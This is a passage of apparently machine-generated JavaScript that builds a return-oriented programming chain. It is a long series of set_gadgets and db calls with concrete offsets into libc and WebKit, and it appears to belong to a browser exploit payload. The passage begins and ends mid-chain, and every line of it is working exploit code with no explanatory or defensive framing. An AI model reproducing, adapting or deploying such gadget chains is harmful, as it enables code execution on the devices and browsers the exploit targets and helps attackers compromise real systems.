webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L634:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L635:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+90648, //L637
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+90664, //L638
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L637:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L638:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+90808, //L642
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+90776, //L640
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+90792, //L641
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L640:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L641:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L642:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+90880, //L644
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L644:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90936, //L645
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L645:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+91016, //L649
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L649:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L647:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L648:
db([7, 0]); // 0x7
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+91120, //L650
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+91136, //L651
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L650:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L651:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+91224, //L653
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L653:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91280, //L654
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L654:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+91352, //L657
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L657:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91408, //L659
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L659:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+91496, //L660
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L660:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L661:
db([40, 0]); // 0x28
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+91600, //L663
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91616, //L664
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L663:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L664:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+91760, //L668
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+91728, //L666
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91744, //L667
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L666:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L667:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L668:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+91840, //L669
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L669:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L670:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+91944, //L672
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+91960, //L673
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L672:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L673:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92104, //L677
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+92072, //L675
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+92088, //L676
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L675:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L676:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L677:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+92176, //L679
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L679:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+92232, //L680
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L680:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+92312, //L684
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L684:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L682:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L683:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+92416, //L685
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+92432, //L686
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L685:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L686:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+92520, //L688
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L688:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92576, //L689
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L689:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+92648, //L692
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L692:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+92704, //L694
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L694:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L695:
libc_base+788575, //pop rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+92840, //L696
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L696:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L697:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+92944, //L699
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+92960, //L700
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L699:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L700:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93104, //L704
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+93072, //L702
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+93088, //L703
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L702:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L704:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93176, //L706
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+93232, //L707
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L707:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+93312, //L711
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L711:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L709:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L710:
db([9, 0]); // 0x9
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+93416, //L712
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+93432, //L713
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L712:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L713:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+93520, //L715
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L715:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93576, //L716
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L716:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93648, //L719
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L719:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+93704, //L721
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L721:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+93792, //L722
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L722:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L723:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+93896, //L725
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+93912, //L726
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L725:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L726:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94056, //L730
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94024, //L728
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94040, //L729
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L728:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L729:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L730:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+94128, //L732
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+94184, //L733
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L733:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94264, //L737
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L737:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L735:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L736:
db([6, 0]); // 0x6
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+94368, //L738
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+94384, //L739
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L738:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L739:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+94472, //L741
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L741:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94528, //L742
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L742:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+94632, //L744
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L744:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L745:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+94736, //L747
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94752, //L748
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L747:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+94896, //L752
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+94864, //L750
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+94880, //L751
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L750:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L751:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L752:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+94968, //L754
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L754:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+95024, //L755
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L755:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+95104, //L759
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L759:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L757:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L758:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+95208, //L760
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+95224, //L761
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L760:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L761:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+95312, //L763
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L763:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95368, //L764
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L764:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+95440, //L767
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L767:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95496, //L769
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L769:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L770:
webkit_base+14461559, //mov [rax], rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+95632, //L771
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L771:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L772:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+95736, //L774
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+95752, //L775
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L774:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+95896, //L779
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+95864, //L777
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+95880, //L778
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L777:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L778:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L779:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+95968, //L781
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L781:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+96024, //L782
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L782:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+96104, //L786
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L786:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L784:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L785:
db([11, 0]); // 0xb
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+96208, //L787
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+96224, //L788
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L787:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L788:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+96312, //L790
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L790:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96368, //L791
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L791:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+96440, //L794
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L794:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+96496, //L796
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L796:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L797:
libc_base+272260, //mov rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+96632, //L798
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L798:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L799:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+96736, //L801
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+96752, //L802
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L801:
